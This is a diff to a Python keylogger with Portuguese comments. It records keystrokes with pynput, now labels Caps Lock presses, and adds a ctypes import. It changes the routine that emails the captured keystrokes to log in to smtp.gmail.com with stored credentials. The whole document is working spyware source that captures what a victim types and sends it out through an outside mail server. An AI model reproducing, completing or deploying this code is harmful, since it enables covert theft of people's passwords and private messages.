@@ -5,6 +5,8 @@ from pynput.keyboard import Key, Listener, Controller
 from user import usuario, senha
 from time import sleep
 import threading
+import ctypes
+
 
 teclado = Controller()  # Controlador de teclado
 letras_com_aspas = []  # Variável que irá armazenar todas as letras pressionadas
@@ -70,7 +72,7 @@ def formatar_letras(letras):
         elif letra == "Key.shift" or letra == "Key.shift_r":
             letras_formatadas.append("")
         elif letra == "Key.caps_lock":
-            letras_formatadas.append("")
+            letras_formatadas.append(" (CAPSLOCK) ")
         elif letra == "Key.ctrl_l" or letra == "Key.ctrl_r":
             letras_formatadas.append("")
         elif letra == "Key.menu":
@@ -188,7 +190,7 @@ def enviar_email():
     mensagem = mensagem_final
 
     # Configurando servidor smtp
-    servidor_smtp = "smtp.servidor.com"  # Use um servidor que tenha autenticação APENAS com e-mail e senha 
+    servidor_smtp = "smtp.gmail.com"
     porta_smtp = 587  # A porta padrão da Lib também funciona, que é a 25, mas a 587 é mais comumente usada
 
     try:
@@ -197,7 +199,7 @@ def enviar_email():
 
         # startttls() é um método opcional dependendendo do servidor, nem todos exigem (gmail.com exige, por exemplo)
         estabelecer_conexao.starttls()
-        
+
         # Fazendo login na conta
         estabelecer_conexao.login(USUARIO, SENHA)
 
